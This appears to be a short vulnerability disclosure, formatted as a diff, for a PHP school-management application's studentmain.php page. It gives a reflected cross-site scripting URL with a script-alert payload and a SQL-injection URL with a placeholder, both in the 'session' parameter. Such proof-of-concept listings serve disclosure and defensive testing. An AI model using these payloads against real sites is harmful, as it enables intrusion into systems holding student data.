@@ -1,0 +1,8 @@
+Cross-site scripting:
+
+http://www.example.com/demo/schoolmv2/html/studentmain.php?session='&quot;--&gt;&lt;script&gt;alert(0x000872)&lt;/script&gt;
+
+
+SQL-injection:
+
+http://www.example.com/schoolmv2/html/studentmain.php?session=[sqli]
